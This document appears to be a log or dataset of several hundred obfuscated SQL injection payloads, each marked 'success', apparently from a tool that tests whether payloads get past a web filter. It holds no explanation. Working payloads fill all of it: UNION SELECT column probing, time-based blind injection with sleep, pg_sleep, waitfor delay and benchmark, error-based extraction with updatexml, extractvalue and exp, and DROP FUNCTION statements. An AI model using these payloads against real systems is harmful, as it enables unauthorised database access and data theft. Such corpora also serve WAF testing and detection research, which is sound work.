+449 success '-(SELECT 8673)" \x0b)   or make_set  (  \'p\'<>\'p!\' OR False,7185  )  /**/and   (  "edap" like "edap '
+450 success 'SelECT sleep\x0b (  0x5  )   AND   /**/(    (   /**/ (  "%"   LIKE   " '
+451 success "-7868' in/**/boolean mode\x0b )   union all/**/SeLeCT (sElEct 5117),5117,0x13fd,5117,0x13fd,5117,5117,5117,5117# {Ra&"
+452 success ' selEcT sleep  (  0x5  )   && "%"   liKe  \t" '
+453 success "-4205'\x0bunion all SELeCT 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986# "
+455 success 'SELect   (\x0b CaSe WHen   (  7254   like   5901  )   THEn 1 eLse 7254*  (  SeLEct 7254 froM master..sysdatabases  )   ENd  )  -- '
+456 success "1   )    )  /**/  )\t  AND updatexml  (  0xd41,concat  (  0x2e,0x7171706a71,  (  selEct   (  elt  (  '0G' liKE '0G' AND True AnD True anD True,0x1   )    )     ) /*/#yk*/,0x717a767a71  )  ,1161  )   aND    (    (     (  '[$' lIKe '[$' "
+457 success '0x1"  )  /**/as\tebvt where \'-}":\'=\'-}":\' '
+459 success '-9871"  ) /**//**/union\x0ball\x0csEleCt (SelECT 0x237a)#\x0b'
+460 success "-6368'\x0cunion/*tB*/all select 6529,6529,6529-- "
+462 success '1,  (  SElEcT   (  cAsE WHEn   (  2426 In (2425,2426,2427)  )   THEN   (  SelEcT 0x622 fROM pg_sleep  (  5   )    )    elSE 1/  (  SEleCT 0  )   eND   )    )    '
+463 success '(sEleCt 0x1)"   )    )    as nncz wheRe 0x91b   LikE/**/\n 0x91b '
+466 success "-2569'\x0cunion all SElECT 4484-- "
+467 success '0x1" wHere 8509 NOT/**/LiKe 8510 OR 4915   liKe     (  SELEcT count  (  *  )   FroM domain.domains as t1,domain.columns/**/AS t2,domain.tables AS t3  )  -- '
+470 success 'selECT\x0cCaSe wHEn 7951   LIKE   1147 ThEN 1 else null END-- 5W'
+472 success '1"   )/**/   )    AS rrms whERe 0x1ff9  =  0x1ff9/*Vu%!}*/or False union all sElECt null,null,null,null,null,null,null,null-- '
+473 success '-8203 \x0b )   /**/)    as eqlf where/**/(sELEct 6132)   like   6132 union all sEleCt 0x17f4,6132,6132,6132,6132,6132,6132,6132,6132-- Xl'
+477 success "-0x1ccb'  ) \x0b/**/union all/**/SelECt 4531,4531,4531# "
+478 success '-(SELECT (SELECT 4191)) /**/)   order by\x0b(SELECT 0x1)# *'
+479 success '1"  )\x0b  aS nyzd Where 2780 LIKE 2780 '
+481 success ' seLEcT * fROM users WHeRe id  =  1 Or ".]" OR 0x1  =  1 or 0 -- 1 '
+482 success 'SeleCt count  (  *  )   FRom domain.domains/**/AS t1,domain.columns aS t2,domain.tables As t3 anD    (    (   /**#o\rs*/ (  "%"   LIkE   " '
+484 success "-9672'   )    )    as rupb WHeRe '8-H!' LIKE '8-H!' oR make_set  (  4954  = /**/1836,1836  )  -- "
+485 success '-(SELECT 6546)"  )  /**/order by 1#\n'
+487 success "(SELECT 1)%'  )  /**/and elt  (  3114   LIKE   3114 AND 7550 LIKE 7550 AND 1 OR '3OU' NOT LIKE '3OU' AND '7;'<>'7;v',sleep  (  5   )    )   # \t?"
+490 success ' SEleCt * fRoM users wHErE id  =  1 Or "{." oR \'`6BkO\'!=\'`6BkOV\' oR \'pM\' not like \'pM\' -- 1 '
+493 success "0x1'||  (  select 'bzxa' WHere 6320   LiKE  /**/6320 "
+494 success '1" wHErE 7110   LIKe   7110 OR 0 '
+495 success "-3088'/**/or '*k'!='*k'' and 'miwk'\x0c =  'miwk "
+496 success '-1591 WHeRE 3291   Like   3291/**/union all seLeCT\x0c3291,3291,3291,3291,3291,3291,3291,3291,3291# '
+498 success 'sELeCT * frOm users WHeRe id  =  1 +  (  1  )   OR 0x1  =  0x1 -- 1 '
+501 success '1   ) /**/  )    As shmg WHerE 1371   liKe \x0c 1371 union all SeLECt null,null,null,null,null,null,null,null,null,null# '
+502 success '-(SElect 0x1bc7)%" union all sElECt/**/6083,6083,0x17c3,(SELECT 6083),6083,6083-- eq'
+503 success '-8633" or/**/5099  =  5974 '
+505 success '-8143 union\tall/**/select 4492,4492,4492,4492,4492,4492,4492,4492,4492# '
+506 success 'seLECT * FrOm generate_series  (  1488,1488,Case WheN   (  1488  =  1685  ) \x0b ThEn 1 eLse 0 End  )   limit 1-- '
+507 success 'SEleCt   (  cASe WheN   (  4043 \xa0 lIKe  /**/5276  )   THEN 4043 elSe 4043*/**/ (  sELecT 4043 from information_schema.character_sets  )   EnD/**/ )  # '
+508 success " And 1   LIKE   utl_inaddr.get_host_address   (    (  \tSELEcT dIsTincT  (  table_name  )   FRom   (  sElecT DisTINCt  (  table_name  )  , ROWNUM aS LIMIT frOm sys.all_tables  )   WHeRE LIMIT  =  6   )    )    AnD 'i'   Like   'i "
+509 success '1 union all SeLeCT/**/null,null,null,null,null,null,null,null,null# '
+511 success "(SeLECT 0x1)' In boolean mode  )   or 0x93f   lIkE     (  SELeCT count  (  *  )  /**/FROM rdb$fields AS t1,rdb$types AS/*;9w%#*/t2,rdb$collations aS t3,rdb$functions\xa0As t4  )  -- "
+513 success '-0x8a3" Or 2113 /**/ like   (SeLEct 8885)# '
+514 success "0x1'+  (/**/ SElECT hett wHEre 7228  =  7228 "
+516 success "waitfor delay/*R@~*/'0:(SELECT 0):5' && '%'  =  ' "
+517 success "-5708 wHErE 3134   lIKe   3134 OR 5903  =    (  'qqpjq'||  (  SelECt CAsE 5903 wHen 5903 tHeN/**/1 ELse 0 EnD froM rdb$database  )  ||'qzvzq'  )  -- "
+518 success 'SeLeCt   (  cAsE When   (  9299  =  2760  ) /*B*/ THEn 1 elSE 9299*  (  seLeCt 9299\x0cfROm master..sysdatabases  )   enD  )  -- '
+519 success '1/**/ )   /**/OR  sleep  (  0x5  )  # '
+520 success "-9098'||  (  select 'xodn' fROM dual wHere 0x200a   LIke  /*(CO*/8202 union all SeLEct 8202,8202,8202,8202,(SELECT 8202),8202,8202-- "
+523 success "1'  )   wHEre '5#\\,' NOT LIKE '5#\\,Y' union all SELEcT/**/null,null,null,null,null,null,null,null,null,null# "
+524 success '-0x2035"   ) \x0b  )/**/  \xa0OR 1102 liKE 1102 anD (SelECt 3465) not like (seleCT 3466) '
+527 success " (  SElEct * FROm   (\n SElEcT  (  sleep  (  0x5   )    )   /**/ )  srmq  )   aND    (    (   'cbaj'   LikE   'cbaj "
+532 success 'SeLect   (  Case WHEN   (  6804   LIKE   7050  )   tHEN 0x1a94 ELse cast  (  1 AS int  )  /  (  selEcT 0 froM dual  )   eND  ) \x0b FRoM dual-- '
+533 success "1'+  ( /**/select 'mtpt' WHerE 9237 NOT LIKE 9238 union all sEleCT null,null,null,null,null,null,null,null,null-- "
+534 success "-(SELECT 6906)' WhErE 7964 NOT LIKE 7965 union all sEleCt 1839,1839,1839,1839,1839-- "
+536 success '"/**/" '
+537 success 'SELECT   (  CASe wHeN   (  7645  =  5921  )   thEn 7645 ELSE 7645*  (  SElECT 7645 FroM information_schema.character_sets  )   END  )  # '
+539 success "1   )    )    as tbiq WherE (SELEcT 7159)   lIKe   (SElECt 7159) oR 'N'<>'N' && 8635   like     (  sEleCt count  (  *  )   From generate_series  (  (SElecT/**/1),5000000   )    )   -- gLQ@"
+540 success '0x1\nuni ON/**/seLECT all from wHeRE '
+541 success "1  )  /**/where 2223/**/ = \x0b2223 AND '_'!='_?' "
+543 success '-1653 union all sELECT 8415,8415,8415,8415,8415,8415,8415,8415#/**/'
+547 success ' SelECt * fROm users WHErE id  =  1 union sElECt @ 1a,version  (    )   -- 1 '
+548 success "(sELEct 1)  )   AS lfra WheRE '0]Y' NOT LIKE '0]YE' And updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  SeLeCt   (  elt  (  3689 lIKE 3689 oR 5713 LiKE 5714,0x1   )    )     )  ,0x717a767a71  ) /**/,1161  )  -- Iv"
+552 success '1"  ) \t aS xioc wHErE 7260  \x0cLIKE   7260 || elt/**/ (  4447<>4448,sleep  (  5   )    )   # '
+554 success "selEcT count  (  *  )   frOM domain.domains AS t1,domain.columns As t2,domain.tables as t3 ANd    (   \x0b(   'wusq' /**/=  'wusq "
+558 success "1'/**//**/)   order by\x0c1# "
+560 success '1"  )   AS lipa\xa0wherE 3450   like   3450/*\x0cS\r*/&& True\x0cAnd 1 AnD make_set  (  \'r\'!=\'rk\',8899\x0c )  -- i'
+561 success ' SElECt * fRoM users wHeRe id  =  0x1 Or  @$#  =  1 union/**/select 0x1,version\x0c (    )  \n-- 1 uQ'
+562 success '-5109   )    )     )   Or make_set  (  6627\xa0  like   7331,7331  )   anD    (    (     (  3746<>3747 '
+563 success "-2820'   )    )    oR 6679   like\n  8848--/**/H"
+566 success '1" whEre 9230   lIKE/**/ \x0c9230 '
+567 success "0x1'  )  \nAs irck WHere 2950<>2951 AND 1 AND\x0b'1IO'<>'1IOb' ||   (  SELect * fROM   (  SElecT  (  sleep  (  5   )    )     )  ydpu  )  -- P"
+568 success "-6639'  )   as/**/trll where '$}' NOT LIKE '$}p' OR 6024<>6024\xa0Or False union all SelECt\x0c6271,0x187f,6271# "
+569 success ' selecT * fRoM users WHeRE id  =/**/ 1 or @#"  (   \x0c= \x0b1 OR 8358=8358 OR \'r<\'!=\'r<\' -- 1 -+'
+570 success 'sELeCt   (  CAsE wHen   (  3539 \t LIkE   8768  )   THeN 3539 Else cast  (  1 As int  )  /  (  sELEct 0 FrOm dual  )   eNd  )   FrOM dual-- '
+571 success '-0xe52"   )    )     )  /**/union all seLeCt 4136,0x1028,4136-- '
+573 success '-(SeLeCT 9496)   )    )     )   Or elt  (  (SeLect 0x1d57)  =  3951,3951  )   And    (    (     ( /**/3514   LIKE  /**/3514 '
+574 success "-4775'  )   or 0xbde  =  (SELECT/**/3038) AND 0x245e LIKE 9310 "
+575 success 'iF  (  4735  =  8907  )   SeLEcT\x0c4735 elSE dROp function qigo-- '
+577 success "0x1' WhERe 0x65c   LIkE   1628 "
+579 success "0x1'+/*uW**/ (\x0c select 'rpds'/**/Where ';Lft'!=';Lft7' anD ')' LIKE ')'# "
+580 success '0x1" union all\nseLECT null,null,null,null,null,null,null#/**/r'
+582 success '(SELECT 0x1)"/*\x0b>3U*/  ) \t  )\x0b   as hace where 5056 NOT LIKE 5057 '
+583 success "-9145'  )   aS xyya WhERE 8950   liKe /**/ 8950 union all sEleCT 8950,8950,8950,8950,8950,8950,8950,8950-- "
+585 success "1%' /**/)  /**/union all seLect null,null,null,null,null-- "
+586 success '-5425 where 5933 /*j.*/ like   5933 union all/**/select 5933,5933,5933-- '
+589 success '-3250%"/**/union all seLecT 7162,7162,7162,7162,7162,7162,7162,0x1bfa,7162--\x0c'
+590 success "0x1'+  (  select 'ohdf' where/**/'Y#-'<>'Y#-T'\tand 5678   LIKE   (SELECT 3277)-- z"
+591 success '-8777"  )   As lalf WHeRE \'l+\' lIKe \'l+\' oR elt  (  4397   LIKE   5823,5823  )  -- '
+592 success "-4406%'\x0bunion all/**/select\n9599,9599,9599,0x257f#\x0c"
+594 success "-(seLect\x0b0x19a7)'   ) /**/ /**/)  /**/\nunion\x0call SElECt 0xc91# #+"
+599 success "-6370'   )\x0b/**/\x0c )/*0b*/   AS sims WHErE 9891 LIKE 9891 AnD 1 union all sELECT 9388,9388,9388,9388,(seleCt 9388),9388,9388,9388# C"
+600 success "sElEct count  (  *  )   FROM generate_series  (  1,(Select 5000000)  )   anD /*d[a~*/  (    (     (  'xori' LIke 'xori "
+601 success "-4817 union all seLECt 0x1cf7,7415,7415,0x1cf7,7415,7415,7415,7415,7415# '{"
+603 success "0x1 whERe/*2\\'*/(sElECT 8921)   LikE   0x22d9 rlike   (  SEleCT * FrOm   ( \tSELect  (  sleep  (  5   )    )\xa0    )  sgvo  )\x0b -- sIJ"
+605 success " (  (SELECT 7098)   Like   7098 OR False oR '}' NOT LIKE '}' AnD sleep \t(  0x5   )    )  "
+606 success "1'  )   wHERe 5680   Like   5680 OR 7862 NOT In (7861,7862,7863) anD   (  3020   likE \xa0 0xbcc  )\x0c *0x1a2f-- "
+608 success "-7006' WheRE 8640 In (8639,8640,8641) oR 5640 NOT LIKE 5640 union all sELeCt 6966,6966,6966,6966# "
+610 success "0x1%'  )   union/**/all select null,null-- "
+614 success "0x1 rlike   ( /**/SeLEct * fRoM   (  SELeCT  (  sleep  ( \x0c(SELecT 5)   )    )  /*7\x0b'8*/\x0c )  sgvo  )  # ewsz bM"
+616 success '1 union/**/all select null,null,null,null,null,null# '
+617 success "-3166'|| /**/( \x0bselect 'mtan' FRoM dual whERe 8041 NOT LIKE 8042 AND 'vMS'!='vMSP' union all/**/SELEcT 9420# 'N"
+618 success "-4055'   )    )    as yoez where 'kb' NOT LIKE 'kby' Or   (  0x210b   LIKE   (SeLECT 8459)  )  *(SELECT 4906)-- i8\t"
+620 success " SelECT * FrOm users wheRE id  =  '0x1' union SEleCt +\\.,@@VERSION -- 1' )"
+621 success '-4045 union all/**/select 6857,6857,6857,6857,6857,6857,6857-- !Yw{'
+622 success 'OR (SELECT/*\nNo*/1)  =  (SELECT 1) /*\t'
+624 success '1"\t\x0c)   As aifd WheRE 5962 \t likE   5962 || 7494<>7494 '
+626 success "(SELECT 0x1)%'   )    )    OR   (  sELEct * frOM   (  seLEcT  (  sleep  (  5   )    )     )  sddo  )  # "
+628 success '/**/oR\xa01   LIKE   0x1/**/|| ""  =   '
+629 success 'SELEcT   (  cASE wHeN   (  4297   like   9086 /**/)   THeN 4297 eLSe (sElECT 1)/  (  SELecT 0  )  /**/eND  )  -- '
+631 success '1 ANd sleep  (  0x5  )  '
+632 success '(SelEcT (sELECt/**/0x1))"   )   /*EZ*/) \t  AS nbdc WhERe \'y\' likE \'y\' OR False union all SElECt null,null-- '
+635 success "-8881%' union all SeLeCt 8420,8420,(SELECT 8420),8420,(SELECT 8420),8420,8420# ["
+636 success "1'|| /**/(/*UcU\r2*/ select 'lzzr'/**/where 0x9ad/**/ =  0x9ad OR ']21J'<>']21J' "
+637 success "1'\x0bin boolean mode  )   waitfor delay '(SELECT 0):0:0x5'--/*z*/"
+638 success "-2397   )   /**/)/**/   AS oizy WhERe 1746  =  1746 AND '-Pk\\U'<>'-Pk\\UZ' AND 8990 NOT LIKE 8991 Or False union all sEleCt 1746,1746,1746,1746,1746,1746#\xa0"
+639 success "1'+  (  sELeCT mrdi WHERE '^t' NOT LIKE '^ta' OR 0 ANd 8594   like     (  SELECt 8594 FRom pg_sleep  (  5   )    )   -- "
+644 success '0x1  )   && (sEleCT 8407)   LIKE     (  seLEct count  (  *  )   froM generate_series  (\x0c 1,5000000   )    )    '
+645 success ' SelecT * FRom users WhERe id  = \x0c1 Or ".@" or 1   liKE /**/ 1 OR \'^\'!=\'^\' -- 1\nR'
+646 success 'If  (  8284\xa0 =  6171  )   SelECT/**/8284 ElsE dRoP function mbih-- c'
+648 success "(SELECT 0x1)'   )    )   /**/rlike sleep  (\x0b 0x5  ) /**/# "
+649 success '-(SELEcT 7901)\t )  /*q`s*/order by 1-- )<t.'
+650 success "0x1  ) /*m'j*/ as rnfb where 3704 NOT LIKE 3705 or (SELECT 8514)   LIKE   benchmark  (  0x4c4b40,md5/**/ (  0x544d5a4c /**/ )    )\n  # "
+657 success '1 aNd elt  (/*j!*/ 4249   LIkE  \x0b0x1099,7259  )   '
+658 success "1' wHeRE\n1614<>1615 union all selEct null,null,null-- g"
+659 success '-8794   )    )\x0c  /*T*/ ) /*6AL*/ union all SElECT 5802,0x16aa,5802-- '
+660 success "0x1' In boolean mode  )   oR   (  seLecT *\x0cFROm   (\t sElecT  (  sleep  (/**/ 0x5   )    )     )  ydpu  )  # m*/R"
+661 success "1'+  (  seLect ukwc wHERE 954!=955 OR False Or   (  SElEcT * FRom   (  SElECT  (  sleep  (  5   )    )     )  sddo  )  # "
+663 success "-2630'   )    )    as xavw where 9686<>9687 OR 'kDk'='kDkY'/**/union all selECT 6291,6291,6291,6291,6291,6291,6291,6291,6291# "
+665 success '0x1  )   aS odqn WhEre \'="p<\' LIKE \'="p<\'\x0c'
+668 success '-2658  )   as\ncasi/**/where 7364/**/ = /**/7364 or 8245   like   0x25b3-- '
+672 success '-(SELECT 4091)"   )    )\x0c  /**/ )   union/*qc*/all select 0x1a26,6694-- y'
+674 success '0x1"/**//**/)   As semi WHErE\xa0\'\t,V\'=\'\t,V\' '
+679 success "SeLeCT benchmark  (  5000000,md5  (  0x4c4d6142   )    )    &&    (    (     (  '%'   likE   '/**/"
+683 success "1'  )   as mqxb where 6294 NOT/**/LIKE 6295 AND 3130 LIKE 3130 AND 8312 like 8312-- r"
+686 success '(seLEcT 1) OR 0x113b  =    (/**/ SEleCT count  (  *\x0c )   froM sysusers aS sys1,sysusers aS sys2,sysusers aS sys3,sysusers aS/**/sys4,sysusers aS sys5,sysusers AS sys6,sysusers As sys7  )  -- ctdx #<*]'
+689 success ' selECt * fRom users whErE id  =  1.*0x1 union seLeCT 0x1,banner froM v$version whERE rownum\n  lIke   1 -- 1 \x0b!'
+690 success '-3420 WhEre\n3334!=(SElect 3335) aND True Or make_set /**/( \t0x986   lIKe   1977,1977  )\x0c -- 4v{$'
+691 success ' union   (  sElEcT NULL, NULL,   (  SElECT @@version   )    )  /**/ -- '
+693 success "waitfor delay '(SELECT 0):0:5' And 'gsvt'  = \t'gsvt "
+694 success "-0x1390'/**/union\x0call/**/select\xa01942,1942,1942,1942,1942,0x796,1942,1942-- +"
+695 success ' SElEcT * fRoM users wHeRe id  =  1 Or "._" OR 1  =  1 aNd 1 -- 1 '
+696 success "(SELECT 1)'/**/anD 8514/**/ =    (  SEleCT count  (  *  )   FROm domain.domains as t1,domain.columns/**/as t2,domain.tables AS t3  )   "
+698 success '1"   )    )    As eglv wherE/**/0x12a6 IN (4773,4774,4775) anD True union all SELeCT null# |T'
+699 success "1   )    )    AS wwkw WHeRE/**/7289  =  0x1c79 AnD 't' LIKe 't' aNd '5' NOT LIKE '5<' && 1-- "
+701 success '-9841 where 4612  =  4612 union all/**/select/**/4612-- '
+702 success '-9434"  )  \tas cqlw WHeRe 1600   like   1600 oR 2733   liKE   1047-- 8'
+705 success 'selEct\x0bpg_sleep  (  0x5  ) /*D>*n*/ &&    (    (   "qani"  =  "qani '
+706 success "1'  )   aS ohcs where 9588   LIKE   9588 OR elt  (  '8`' NOT LIKE '8`d' && 7103 IN (7102,7103,7104),sleep  (  5/**/  )    )   -- <"
+708 success '1"  )   Where 0x1010   lIKe   4112 anD 1 Or False\xa0AnD (selecT 1111)=1111 '
+711 success "(SelECT 0x1)'/*|w*/ )   OR 0x93f  =    (  selEct count  (  *  )  \x0bfRom rdb$fields As t1,rdb$types aS t2,rdb$collations AS t3,rdb$functions As t4  )  -- +l"
+712 success "1'  )   As syer wHErE 3141  =  3141 OR 'fY[\t' LIKE 'fY[\t^' rlike   (  sElecT   (  CaSE WheN   (  6233   LIKE   7567  )   thEN 1 ELse 0x28 eNd   )    )   --\t"
+715 success '\x0bsELeCt * fROM users whERe id   liKE  \x0b1 Or 1#"? oR 0x1  =  1 OR \'6%VN\' NOT LIKE \'6%VN\' -- 1 N'
+720 success ' end and/**/ /**/ (  \x0b (   "dmgj"  =  "dmgj '
+721 success "1',extractvalue  (  9788,concat /**/(  0x5c,0x7171706a71,  (  selEct   (  elt \x0c(  0x952 iN (2385,0x952,2387)  Or  7092 lIkE 7093,0x1   )    )     )  ,0x717a767a71   )/**/   )    "
+722 success "1'+  (  SElEct nash whERE 4159   LIke   4159/**/union all selECT null# "
+725 success '1" oR   (  sELEct 0x2*  (  if   (    (   SEleCT * frOm   (  seLeCt concat  (  0x7171706a71,  (  seleCT  \n(  elt  (  8802 Like 8802,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )  \n  )   '
+726 success "1' whERE 0x24c8 \x0c LIKe   (sELeCT 9416)/**/"
+727 success 'selECT   (  caSE WHEN   (  5418   lIKe   0x1974  )   theN 1 eLse 0x152a*  ( /**/sELEcT 5418 FrOM master..sysdatabases  )   ENd/**/ )  -- '
+728 success "0x1'   )    )    AND 8594   LikE     (  sELeCt 8594 FRom pg_sleep  (  5   )    ) /*8O>*/ -- hE"
+730 success '-1487"  )   as crfi wHErE 989 NOT LIKE 990 Or 0 And True union all Select 2407,2407,2407,0x967,2407,2407,2407,2407,2407,2407-- k~P'
+732 success 'select count  (  *  )/**/  from generate_series  (\t 0x1,5000000  )   && "ihbe" LIKE "ihbe '
+738 success '(SELECT\t0x1c)%/**/'
+741 success '1 wHeRE 5443   LIKE /**/ 5443 '
+743 success '-2817  )   whErE\t1212  =  1212 oR 9091<>9091 oR 3266  =  1102 '
+746 success "select case when 3661 /*'+*/ LIKE   (SELECT 9315) then 0x1 else null end-- "
+749 success "1  )   where 'Glf'<>'Glf{' "
+752 success "\tselECT * froM users WHerE id   LIKe   '(SELECT 0x1)' or \\<$ union sElect 1,@@VERSION -- 0x1' %"
+754 success "-2120'  )  /**/Or 8734  =\n 8844# ?EG"
+759 success "1'||  (  select 'zyvk' frOM dual WHerE\n(SElECt 0x818)   LIKE  /**/0x818/*C*/"
+761 success '1" wHErE \'|\'=\'|\' aND 0x1/**/union all/*0*/selecT\x0bnull,null,null,null,null,null,null-- oc'
+762 success '/**/seleCT * from users whErE id  =  1 Or "  (  _" OR 606 iN (605,606,607) -- 1 '
+764 success '1  )   as ghew WHerE 3379<>3380 union all seleCt null,null-- '
+765 success "0x1'  )   Where 8291  =  8291 AND 9176 NOT LIKE 0x23d9 oR 0 "
+774 success 'selecT   (  CaSE whEN /*N?V24*/ (  3863   LikE /**/ (selecT 1151)  )   THEn 3863 eLse cast  (  1 aS int  )  /  (  SeLect (sELEcT 0x0) fROm dual  )   eNd  )   FrOm dual-- '
+775 success "(SELECT 0x1)' in/**/boolean mode  )    OR  sleep  (  5  )\t # "
+776 success "1' wHeRE 0x2055 \n/**/LIKE   8277 OR updatexml/**//**/(  1808,concat  (  0x2e,0x7171706a71,  (  SELEct   (  elt  (  'OoR' LIKE 'OoR' AND 3483 NOT LIKE 3484 AND (SELECT 7641) LIKE 7641 OR 0x0,1   )    )     )  ,0x717a767a71  )  ,8666  )  -- 00"
+777 success '1  )   wherE 7096/**/ =  7096 '
+778 success '1"   )   \xa0)    aS vbpl WhERe (SEleCt 3885)   LikE /**/ 0xf2d AnD/**/6969   like     (  Select 6969 fROM pg_sleep  (  5   )   /**/)   -- '
+781 success ' (  SelEcT   (  CAse wHEn   (  (SELECT 4108)   liKE   4108 OR 0  )   tHeN 1 elSE (SeLECT 4108)*  (  SELEct 4108 frOm information_schema.character_sets\t )   END   )    )  '
+782 success "waitfor delay '0:0:5' anD   (  4614   LIKE   4614 AND 'j' NOT LIKE 'jz' "
+783 success '-5575"\x0cunion all/**/seLEct 8665,8665,8665,8665,8665,8665,8665--/*8lA(*/'
+785 success '1,  (  SeLecT   (  caSE wHEN   (  7616   lIkE /*"{f*/ 7616  )  /**/THEn (SeleCt/**/0x1) elSe 1/\n (  SElEct 0  )   END   )   \n)    '
+786 success '1"   )    )   \tAS ynuw whEre/**/9138   lIke   9138 '
+788 success 'sELecT * fRom users wheRe id  =  1 + $+%1 OR 1  =  1 AND 9310 LIKE 9310 -- 1 '
+789 success 'iif  (  7011 /**/ lIKE   2522,1,1/0  ) /*a4xT4*//**/'
+790 success '1 &&/**/6510   like     (  SElect count  ( \xa0*  )  /**XA*/FrOm sysusers as sys1,sysusers aS sys2,sysusers As sys3,sysusers As sys4,sysusers as sys5,sysusers AS sys6,sysusers AS sys7  )  -- ixlk b$'
+796 success ' SElecT * frOM users WHerE id  = \x0b1 Or ";[" oR 1  =  1 OR\t0 -- 1 '
+797 success 'declare @s varchar  (  200  )   SeleCt @s    LikE    0x77616974 ... '
+798 success "-2223'   )    )    AS mjwp WhERE 8650  =  8650 OR 7900  =  5838 "
+802 success "1\x0bwhere 2301 /**/=  2301  OR  'H8'!='H8' OR/**/0 "
+804 success 'SEleCt LiKE  (  \'abcdefg\',upper  (  hex  (  randomblob  (/*]72*/ 500000000/(sELecT 2)   )    )      )    )     AND  "ejmj" lIke "ejmj '
+805 success '1,exp  (  ~  (  SeLecT * FROm   (  SELEcT concat  (  0x7171706a71,  (  SelEct   (  elt  (  4902 iN (4901,4902,4903) && True or 8746 LIKe 8747,(seLect 1)  /*%A30*/)    )  \n  )  ,0x717a767a71,0x78   )    )\t  x   )    )    '
+806 success 'sELEct count  (  *  )   frOm sysibm.systables As/**/t1,sysibm.systables As t2,sysibm.systables As t3-- '
+808 success "1  )   and make_set \x0c( /**/8403   LIKE   8403 AND '&,f' NOT LIKE '&,f4',8899  )   "
+810 success "0x1' where 1593   LIKE /**/\t1593 "
+817 success "1' IN boolean mode  )   union/**/all seLeCT null,null,null,null,null-- "
+822 success 'iif  (  4460/**/  LIKE   1610,1,1/0  ) \t '
+823 success ' seLEcT * from users wHErE/**/id   LIKE  /**/0x1  OR  @#",  =\n 0x1\x0cunion SELEcT (SELECT 1),version  ( /**/  )   -- (SELECT 1) '
+826 success '-1390%"   )    )    union all/**/select 8930,8930,8930,8930,8930# '
+827 success '0x1"  )   aS tnux wHERe \'NM\' not like \'NM=\' rlike   (  SelecT * FRom/**/  (  SElECt  (  sleep\x0b (  0x5   )/*yxws*/   )     )  vwyq  )  # '
+829 success 'SeLeCT CaSE\xa0wHEn 2599   LIKe   7035 TheN 1 ElSe null end-- +.n'
+830 success "sELECT count  (  *  )   FrOm domain.domains aS t1,domain.columns As t2,domain.tables as t3 AnD \x0b  (    (  /**/'zaru'   LIKE   'zaru "
+831 success '-6731" wHERE\t6166  /*G\n(*/lIke   6166\nanD 0x1 union/*sk*/all\tSeLeCt 6166,(seLECT 6166),6166,6166,6166,6166-- g1'
+833 success '0x1"   )\xa0   )    union all/**/SeLEct null,null,null,null,null,null# '
+834 success '1" WhERE 2619  =  2619 OR 8475!=8475 ANd 2823  =  5100# '
+835 success '(SELECT 0x1)%"  )   AnD (SELECT 8594)   LIKe     (  selEct 8594 FroM pg_sleep  (  0x5   ) /**/  )   -- ,'
+837 success '1 ANd   (  SELEct 2*  (  IF   (    (   SElECT * fRom/**/  (  sElEcT concat  ( /**/0x7171706a71,  (  seLeCt   (  elt  (  3484/**/ /**/LIKe   3484 And (SelECT (sELect 1)) Or False,0x1   )    )     )  ,0x717a767a71,0x78   )  \t )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  # couj s'
+840 success ' SELecT * FrOm users wHERE id   like   0x1. union SELEcT null,version  (    )   -- 0x1 '
+843 success "-5379'  )/*d\nB?*/  union all\x0cselecT 0x10c6,4294,4294-- "
+844 success "1   )    )     )   And exp  (  ~  (  SELeCT * From   (  SEleCt concat  ( \t0x7171706a71,  (  SELEcT   (  elt  (  0x1ffe   LIke   8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    And    (    (     (  '[pp'<>'[pp&' Or 4288 LIkE (SELECT 4289) "
+846 success "1'+  (  select 'sacd' wheRe 'n' NOT LIKE 'n2' union all selECt null,null,null,null,null,null,null# "
+848 success "-0xb60'\x0b/*SS*/ )    )    order by 0x1-- "
+850 success "1'  )   anD elt  (  9429 NOT LIKE 9430,7259/*=E4ZG*/ )   "
+851 success "1' wHere 'N&' NOT LIKE 'N&>' OR/**/0x1a89  =    (  SELECT 0x1a89 fROM pg_sleep  (  5  /**/)    )   -- "
+852 success 'SelECT count  (  *  )   FROm rdb$fields AS t1,rdb$types As t2,rdb$collations aS t3,rdb$functions as t4 aNd    (    (     ( /**/"dskh"   like   "dskh '
+853 success ' (  case when 8422   like   8452 then 1 else/**/null end  )  '
+854 success "1'||  (  select/**/'kyhs' from dual/**/where 9491  =\t 9491/**/"
+855 success 'seLeCt count  (  *  )   FrOm sysibm.systables AS t1,sysibm.systables aS t2,sysibm.systables As t3 aNd/**/   (    (   "%"   LIKE   " '
+858 success 'iif  (  4638   lIKE   0x2042,1,1/0  )   '
+860 success "1'+  (  SeLECT eluw whERe 6210  =  6210 ANd 9686 IN (9685,9686,9687) oR 0x0 "
+861 success '1"  )   WHeRE \'rb\' NOT LIKE \'rb\\\' && True AnD exp  (  ~  (  SeLeCT * FrOM   (  seLEcT concat  (  0x7171706a71,  (  seLEcT   (  elt  (  8190   LIKE   8190 OR False AND True,0x1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )  \xa0-- n'
+862 success "(selecT 0x1)'  )  \nrlike \x0c (  sElEct * fROm   (  seleCT  (  sleep  (  (sElEcT 5)   )/*&A;2c*/ /**/ )     ) \nsgvo  )  "
+863 success ' sELeCt */**/FrOm users WHeRe id  =  0x1 *\\. union/**/sELeCT null,@@VERSION -- 1 i(V'
+864 success '0x1%" \n)   union/*R*N*/all selEcT\xa0null,null,null,null,null,null,null,null,null-- Q'
+865 success ' sElect * FROm users WhErE id  =  1 Or 1#"? union Select \'a\',version  (    )\t  -- 1 '
+866 success '-8128" /**//**/)  \x0b/**/)   /**/aS/**/ovjz wHeRE \'z\'[\'=\'z\'[\' union all SeLeCT 7375,7375,0x1ccf,7375,7375,7375,7375,7375,7375-- F'
+867 success '1  )   wheRE 7588/**/  LIKE   (SeLEct 7588) oR 7417/*6RGy*/ =    (  sElecT count  (  *  )   FROm sysibm.systables As t1,sysibm.systables As\x0ct2,sysibm.systables aS t3  )  -- '
+868 success '-9958"  )   aS jzvq WHeRe 5507 NOT LIKE 5508 And True ANd \'8nJ\'=\'8nJ\' union\xa0all sELEct 3741,3741,3741# '
+869 success '-5539"  )  /**/union all sEleCT 6189,6189,0x182d,6189,6189,6189,6189,6189,6189-- '
